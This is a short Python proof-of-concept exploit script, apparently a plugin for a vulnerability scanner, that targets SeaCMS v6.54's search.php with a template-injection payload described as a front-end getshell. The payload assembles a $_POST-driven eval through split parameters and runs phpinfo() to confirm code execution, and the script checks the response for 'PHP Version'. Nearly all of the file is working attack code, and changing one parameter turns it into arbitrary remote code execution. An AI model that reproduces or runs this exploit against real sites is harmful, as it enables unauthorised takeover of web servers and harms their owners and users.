import requests
import random

# seacms v6.54 前台Getshell
def poc(url, logindict, user_agent, proxy):
    url = url.strip("/")
    header = {
        'User-Agent': user_agent,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # 漏洞位置
    exploit_url = url + '/search.php'
    datas = "searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan={searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9])&9=phpinfo();"
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(exploit_url, headers=header, data=datas, proxies=proxies)

    else:
        response = requests.post(exploit_url, data=datas, headers=header)
    # with open('b.html','wb') as f:
    #     f.write(response.content)
    # print(response.text)
    if response.status_code == 200:
        if 'PHP Version' in response.text:
            return 'seacms v6.54 - 前台Getshell '

def run(url, logindict, user_agent, proxies):
    result = poc(url, logindict, user_agent, proxies)
    return result

# run("http://127.0.0.1/seacms6.54/",{'admin':'admin'},'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0','127.0.0.1:8080')

